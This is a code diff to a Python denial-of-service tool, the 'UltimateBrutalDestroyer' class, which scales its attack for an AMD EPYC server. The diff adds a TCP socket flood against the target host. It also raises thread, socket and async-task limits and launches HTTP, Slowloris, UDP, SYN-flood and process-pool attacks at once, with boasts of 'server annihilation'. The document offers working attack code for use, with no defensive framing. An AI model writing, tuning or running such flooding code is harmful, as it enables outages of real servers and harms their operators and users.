@@ -25,6 +25,7 @@ import warnings
 import queue
 import logging
 import signal
+import numpy as np
 
 # Ignore all warnings
 warnings.filterwarnings('ignore')
@@ -44,12 +45,13 @@ class UltimateBrutalDestroyer:
         self.lock = threading.Lock()
         self.running = True
         
-        # System resources - HALVED for better stability
-        self.cpu_count = multiprocessing.cpu_count()
-        self.max_workers = self.cpu_count * 500  # Reduced from 1000 to 500 workers per CPU core
-        self.max_sockets = 10000  # Reduced from 20000 to 10000
-        self.max_async_tasks = 5000  # Reduced from 10000 to 5000
-        self.max_processes = self.cpu_count  # Reduced from cpu_count * 2 to cpu_count
+        # System resources - OPTIMIZED FOR AMD EPYC-GENOA (4 cores, 8 threads)
+        self.cpu_count = 4  # Physical cores
+        self.cpu_threads = 8  # Logical threads (2 per core)
+        self.max_workers = 8000  # 2000 workers per core for EPYC power
+        self.max_sockets = 50000  # Maximum socket connections for EPYC
+        self.max_async_tasks = 20000  # Maximum async tasks for EPYC
+        self.max_processes = 8  # Use all logical threads
         
         # Thread pool for better efficiency
         self.thread_pool = ThreadPoolExecutor(max_workers=self.max_workers)
@@ -490,27 +492,114 @@ class UltimateBrutalDestroyer:
             except Exception:
                 pass
 
+    def epyc_optimized_attack(self):
+        """EPYC-optimized attack using all 8 logical threads"""
+        while self.running:
+            try:
+                # Use all logical threads efficiently
+                for _ in range(1000):  # Heavy workload for EPYC
+                    if not self.running:
+                        break
+                    
+                    # AVX-512 optimized calculations (EPYC supports this)
+                    size = 1000
+                    matrix1 = np.random.random((size, size))
+                    matrix2 = np.random.random((size, size))
+                    result = np.dot(matrix1, matrix2)  # Uses AVX-512
+                    
+                    # Prime number calculations using all cores
+                    for n in range(1000, 10000, 100):
+                        is_prime = True
+                        for i in range(2, int(n ** 0.5) + 1):
+                            if n % i == 0:
+                                is_prime = False
+                                break
+                
+            except Exception:
+                pass
+            
+            time.sleep(0.0001)  # Ultra-fast for EPYC
+
+    def epyc_memory_attack(self):
+        """EPYC memory attack using large cache (32MB L3)"""
+        memory_blocks = []
+        while self.running:
+            try:
+                # Utilize EPYC's large L3 cache (32MB)
+                for _ in range(20):  # More blocks for EPYC
+                    if not self.running:
+                        break
+                    # Allocate 2MB blocks to fill L3 cache
+                    block = bytearray(2 * 1024 * 1024)
+                    for i in range(0, len(block), 1024):  # Process in chunks
+                        block[i:i+1024] = os.urandom(1024)
+                    memory_blocks.append(block)
+                
+                # Keep blocks to utilize cache
+                if len(memory_blocks) > 200:  # More blocks for EPYC
+                    memory_blocks = memory_blocks[-200:]
+                
+            except Exception:
+                pass
+            
+            time.sleep(0.001)  # Fast for EPYC
+
+    def epyc_network_flood(self):
+        """EPYC-optimized network flood using all cores"""
+        while self.running:
+            try:
+                # Create more connections for EPYC power
+                sockets = []
+                for _ in range(200):  # More sockets for EPYC
+                    if not self.running:
+                        break
+                    try:
+                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                        sock.settimeout(0.5)  # Faster timeout for EPYC
+                        sock.connect_ex((self.host, self.port))
+                        sockets.append(sock)
+                    except Exception:
+                        pass
+                
+                # Send larger data packets for EPYC
+                for sock in sockets:
+                    try:
+                        data = os.urandom(random.randint(2048, 16384))  # Larger packets
+                        sock.send(data)
+                    except Exception:
+                        pass
+                    finally:
+                        try:
+                            sock.close()
+                        except Exception:
+                            pass
+                
+            except Exception:
+                pass
+            
+            time.sleep(0.0001)  # Ultra-fast for EPYC
+
     def ultimate_destruction(self):
         """Launch all attack types simultaneously using all system resources"""
         print("🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥")
-        print("💀💀💀    ULTIMATE BRUTAL SERVER DESTROYER    💀💀💀")
+        print("💀💀💀    AMD EPYC-GENOA ULTIMATE DESTROYER    💀💀💀")
         print("🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥")
         print(f"🎯 TARGET: {self.target_url}")
         print(f"💻 CPU CORES: {self.cpu_count}")
         print(f"🧵 MAX WORKERS: {self.max_workers}")
         print(f"🔌 MAX SOCKETS: {self.max_sockets}")
         print(f"⚡ MAX ASYNC TASKS: {self.max_async_tasks}")
-        print("🚨 ALL ATTACK TYPES ACTIVE - TOTAL ANNIHILATION MODE!")
+        print("🚨 ALL ATTACK TYPES ACTIVE - EPYC ANNIHILATION MODE!")
         print("⚡ Press Ctrl+C to stop the carnage")
         print("=" * 80)
         
         # Start all attack types
         threads = []
         
-        # 1. Multi-threaded HTTP attacks - HALVED for speed
+        # 1. Multi-threaded HTTP attacks - EPYC OPTIMIZED
         print("🚀 Starting HTTP thread army...")
-        thread_batch_size = 250  # Reduced from 500 to 250
-        max_threads = min(self.max_workers, 1500)  # Reduced from 3000 to 1500
+        thread_batch_size = 1000  # Larger batches for EPYC
+        max_threads = 4000  # 4000 threads for EPYC power
         
         for batch in range(0, max_threads, thread_batch_size):
             batch_end = min(batch + thread_batch_size, max_threads)
@@ -526,47 +615,61 @@ class UltimateBrutalDestroyer:
                 thread.start()
                 threads.append(thread)
             
-            # Minimal delay for maximum speed
-            time.sleep(0.001)  # Ultra-fast
+            # Minimal delay for EPYC speed
+            time.sleep(0.0001)  # Ultra-fast for EPYC
             print(f"   Created {len(threads)} threads...")
         
         print(f"✅ HTTP thread army complete: {len(threads)} threads")
         
-        # 2. Fast Thread Pool Attack - HALVED
-        print("⚡ Starting fast thread pool attack...")
-        for i in range(self.cpu_count):  # Reduced from cpu_count * 2 to cpu_count
-            pool_thread = threading.Thread(target=self.fast_thread_pool_attack, daemon=True)
-            pool_thread.start()
-            threads.append(pool_thread)
+        # 2. EPYC-Optimized Attacks - MAXIMUM POWER
+        print("🔥 Starting EPYC-optimized attacks...")
+        for i in range(8):  # Use all 8 logical threads
+            epyc_thread = threading.Thread(target=self.epyc_optimized_attack, daemon=True)
+            epyc_thread.start()
+            threads.append(epyc_thread)
         
-        # 3. CPU-intensive attacks - HALVED
+        # 3. EPYC Memory Attacks
+        print("💾 Starting EPYC memory attacks...")
+        for i in range(4):  # 4 threads for memory (one per physical core)
+            epyc_memory_thread = threading.Thread(target=self.epyc_memory_attack, daemon=True)
+            epyc_memory_thread.start()
+            threads.append(epyc_memory_thread)
+        
+        # 4. EPYC Network Flood
+        print("🌊 Starting EPYC network flood...")
+        for i in range(8):  # 8 threads for network (all logical threads)
+            epyc_network_thread = threading.Thread(target=self.epyc_network_flood, daemon=True)
+            epyc_network_thread.start()
+            threads.append(epyc_network_thread)
+        
+        # 5. CPU-intensive attacks - OPTIMIZED FOR 4 CORES
         print("🔥 Starting CPU-intensive attacks...")
-        for i in range(self.cpu_count):  # Reduced from cpu_count * 2 to cpu_count
+        for i in range(4):  # 4 threads for 4 CPU cores
             cpu_thread = threading.Thread(target=self.cpu_intensive_attack, daemon=True)
             cpu_thread.start()
             threads.append(cpu_thread)
         
-        # 4. Memory-intensive attacks - HALVED
+        # 6. Memory-intensive attacks - OPTIMIZED FOR 4 CORES
         print("💾 Starting memory-intensive attacks...")
-        for i in range(max(1, self.cpu_count // 2)):  # Reduced from cpu_count to cpu_count // 2
+        for i in range(2):  # 2 threads for memory usage
             memory_thread = threading.Thread(target=self.memory_intensive_attack, daemon=True)
             memory_thread.start()
             threads.append(memory_thread)
         
-        # 5. Network flood attacks - HALVED
+        # 7. Network flood attacks - OPTIMIZED FOR 4 CORES
         print("🌊 Starting network flood attacks...")
-        for i in range(self.cpu_count):  # Reduced from cpu_count * 2 to cpu_count
+        for i in range(4):  # 4 threads for network flooding
             network_thread = threading.Thread(target=self.network_flood_attack, daemon=True)
             network_thread.start()
             threads.append(network_thread)
         
-        # 6. Slowloris attack
+        # 8. Slowloris attack
         print("🐌 Starting Slowloris destroyer...")
         slowloris_thread = threading.Thread(target=self.slowloris_destroyer, daemon=True)
         slowloris_thread.start()
         threads.append(slowloris_thread)
         
-        # 7. Async attack with proper cleanup
+        # 9. Async attack with proper cleanup
         print("⚡ Starting async destroyer...")
         def run_async_attack():
             try:
@@ -599,30 +702,30 @@ class UltimateBrutalDestroyer:
         async_thread.start()
         threads.append(async_thread)
         
-        # 8. UDP flood - HALVED
+        # 10. UDP flood - OPTIMIZED FOR 4 CORES
         print("💥 Starting UDP flood...")
-        for i in range(max(1, self.cpu_count // 2)):  # Reduced from cpu_count to cpu_count // 2
+        for i in range(2):  # 2 threads for UDP flood
             udp_thread = threading.Thread(target=self.udp_flood_attack, daemon=True)
             udp_thread.start()
             threads.append(udp_thread)
         
-        # 9. SYN flood simulation - HALVED
+        # 11. SYN flood simulation - OPTIMIZED FOR 4 CORES
         print("🔥 Starting SYN flood simulation...")
-        for i in range(self.cpu_count):  # Reduced from cpu_count * 2 to cpu_count
+        for i in range(4):  # 4 threads for SYN flood
             syn_thread = threading.Thread(target=self.syn_flood_attack, daemon=True)
             syn_thread.start()
             threads.append(syn_thread)
         
-        # 10. Multi-process attack - HALVED
+        # 12. Multi-process attack - EPYC OPTIMIZED
         print("🚀 Starting process army...")
-        process_pool = ProcessPoolExecutor(max_workers=self.max_processes)
+        process_pool = ProcessPoolExecutor(max_workers=8)  # Use all 8 logical threads
         process_futures = []
-        for i in range(self.max_processes):
+        for i in range(8):
             future = process_pool.submit(self.process_worker, i)
             process_futures.append(future)
         
-        print(f"💀 TOTAL DESTRUCTION INITIATED - {len(threads)} THREADS + {self.max_processes} PROCESSES")
-        print("🔥 MAXIMUM SYSTEM RESOURCE UTILIZATION ACTIVE!")
+        print(f"💀 TOTAL DESTRUCTION INITIATED - {len(threads)} THREADS + 8 PROCESSES")
+        print("🔥 AMD EPYC-GENOA MAXIMUM POWER UTILIZATION ACTIVE!")
         print("=" * 80)
         
         # Monitor and display stats
@@ -639,7 +742,7 @@ class UltimateBrutalDestroyer:
                       f"FAILED: {self.failed_requests:,} | "
                       f"TIME: {elapsed:.0f}s | "
                       f"THREADS: {len([t for t in threads if t.is_alive()])} | "
-                      f"CPU CORES: {self.cpu_count} | "
+                      f"EPYC CORES: 4/8 | "
                       f"MAX POWER: ACTIVE", 
                       end="", flush=True)
                 
@@ -673,7 +776,7 @@ class UltimateBrutalDestroyer:
             print(f"✅ Successful: {self.successful_requests:,}")
             print(f"❌ Failed: {self.failed_requests:,}")
             print(f"🔥 Average RPS: {final_rps:.2f}")
-            print(f"💻 System Resources Used: {self.cpu_count} CPU cores")
+            print(f"💻 System Resources Used: AMD EPYC-Genoa (4 cores, 8 threads)")
             print(f"🧵 Threads Deployed: {len(threads)}")
             print("💀 SERVER ANNIHILATION COMPLETE 💀")
             print("=" * 80)
